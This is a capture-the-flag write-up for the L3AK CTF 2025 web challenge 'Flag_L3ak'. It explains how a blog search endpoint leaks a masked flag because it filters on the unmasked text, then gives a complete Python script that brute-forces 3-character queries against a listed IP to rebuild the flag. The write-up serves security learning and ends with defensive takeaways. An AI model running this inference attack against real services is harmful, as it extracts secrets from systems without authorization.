# 🛡️ CTF Challenge: L3AK_CTF - Flag_L3ak

**URL**: [http://34.134.162.213:17000](http://34.134.162.213:17000)  / [L3AK_CTF2025](https://ctf.l3ak.team/challenges)

**Category**: Web  
**Difficulty**: ★☆☆☆☆

---

## 🧠 Description

We are presented with a blog application that includes a basic search functionality. Our goal is to retrieve the real flag stored internally on the server.

> _"What's the name of this CTF? Yk what to do 😉"_

---

## 🔍 Initial Recon

Visiting the main page reveals a standard blog with a few posts. Upon inspecting the code and endpoints, we find three API routes:

---

## 📑 API Summary

### `/`
Serves the main HTML page.

---

### `/api/posts`

- Returns all blog posts.
- Any real flag string is **masked** with asterisks (`*`).
- Example:
  ```json
  {
    "content": "Well luckily the content of the flag is hidden so here it is: ********************"
  }

---

### /api/search
	
•	Accepts a POST request with a query parameter.
 
•	The query must be exactly 3 characters long.
 
•	Filters posts where the title, content, or author contains the substring.
 
•	Any instance of the real flag is masked in the output.

---

🧱 Source Code (Core Logic)
  ```python
const FLAG = 'L3AK{t3mp_flag!!}';

app.post('/api/search', (req, res) => {
   const { query } = req.body;
   if (!query || typeof query !== 'string' || query.length !== 3) {
       return res.status(400).json({ error: 'Query must be 3 characters.' });
   }

   const matchingPosts = posts
       .filter(post => post.title.includes(query) || post.content.includes(query) || post.author.includes(query))
       .map(post => ({
           ...post,
           content: post.content.replace(FLAG, '*'.repeat(FLAG.length))
       }));

   res.json({ results: matchingPosts });
});
  ```

---

🚨 Vulnerability Analysis

•	The real flag is stored in memory as plaintext.

•	Although /api/posts masks it, /api/search still performs filtering before masking.

•	Therefore, if the search query matches part of the real flag, the response will contain a result — allowing us to determine matching substrings.

---

🧨 Exploitation Plan

1.	We know the flag format: L3AK{...}
2.	Only 3-character queries are allowed.
3.	We brute-force one 3-letter substring at a time and observe if the count of results increases (i.e., search hits).
4.	We reconstruct the flag by chaining matched substrings.
---
😈 Exploit code
  ```python
import requests
import time

TARGET_URL = "http://34.134.162.213:17000/api/search"
HEADERS = {
    "Content-Type": "application/json",
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept-Language": "ko-KR,ko;q=0.9",
    "Origin": "http://34.134.162.213:17000",
    "Referer": "http://34.134.162.213:17000/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@#$%^&*()+-=[]|;:,.<>?/\\"


def send_request(payload):
    try:
        data = {"query": payload}
        response = requests.post(TARGET_URL,
                                 headers=HEADERS,
                                 json=data,
                                 timeout=10)

        return response.status_code, response.json()
    except Exception as e:
        print(f"[ERROR] Request failed for '{payload}': {e}")
        return None, None


def check_flag_in_response(response_data):
    if not response_data or 'results' not in response_data:
        return False

    for post in response_data['results']:
        if ('Not the flag?' in post.get('title', '') and
                '*' in post.get('content', '')):
            return True

    return False


def find_flag():
    found_flag = "L3AK{L3ak1ng_th3"

    print(f"[INFO] Starting from known prefix: {found_flag}")
    print(f"[INFO] Charset: {CHARSET}")

    while True:
        found_next = False

        last_two = found_flag[-2:]

        print(f"\n[SEARCHING] Current flag: {found_flag}")
        print(f"[SEARCHING] Testing with last two chars: '{last_two}' + new char")

        for char in CHARSET:
            payload = last_two + char
            print(f"[TEST] {payload}", end=" ")

            status_code, response_data = send_request(payload)

            if status_code == 200 and check_flag_in_response(response_data):
                found_flag += char
                print(f"✅ FOUND!")
                print(f"🚩 [EXTEND] Current flag: {found_flag}")
                found_next = True
                break
            else:
                print("❌")

            time.sleep(0.1)

        if not found_next:
            print(f"\n🎉 [COMPLETE] No more characters found. Final flag: {found_flag}")
            break

        if found_flag.endswith('}'):
            print(f"\n🎉 [COMPLETE] Flag ends with : {found_flag}")
            break

    return found_flag


def test_payload(payload):
    print(f"[TEST] {payload}")
    status_code, response_data = send_request(payload)

    if status_code == 200:
        if check_flag_in_response(response_data):
            print(f"✅ MATCH! Found flag post")
            return True
        else:
            print(f"❌ No flag post found")
    else:
        print(f"❌ Status: {status_code}")

    return False


if __name__ == "__main__":
    print("=" * 50)
    print("🚩 CTF Flag Finder (Starting from L3AK{L3ak1ng_th3)")
    print("=" * 50)

    print("\n[CONNECTION TEST]")
    test_payload("abc")
    
    print("\n[VERIFY PREFIX]")
    test_payload("h3")
    test_payload("th3")

    print("\n[STARTING BRUTEFORCE FROM L3AK{L3ak1ng_th3]")
    result = find_flag()

    if result:
        print(f"\n🎉 FINAL FLAG: {result}")
    else:
        print("\n❌ Failed to find complete flag")
  ```
---

✅ Takeaways

•	Even if sensitive data is masked in output, search-based inference attacks can reveal it.
 
•	Always sanitize and protect search logic when handling sensitive internal values.
 
•	Limit queryability or use token-based results rather than direct string matching on secure content.

---
